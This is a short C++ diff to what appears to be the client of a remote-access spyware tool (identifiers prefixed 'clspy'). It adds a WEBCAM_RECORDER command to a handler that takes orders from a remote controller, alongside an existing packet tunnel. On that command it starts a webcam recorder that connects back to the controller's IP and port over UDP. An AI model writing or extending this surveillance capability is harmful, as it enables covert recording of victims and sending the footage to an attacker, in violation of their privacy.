@@ -130,6 +130,10 @@ void Client::start() {
                         printf("[Client] Received PACKET_TUNNEL command");
                         clspy_tunnel = new CLPacketTunnel();
                         rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
+                    } else if (command_code == WEBCAM_RECORDER) {
+                        printf("[Client] Received WEBCAM_RECORDER command");
+                        clspy_tunnel = new CLWebcamRecorder();
+                        rc = clspy_tunnel->init(ip_, port_ + command_arg, UDP_BASED);
                     }
 
                     if (rc < 0) {
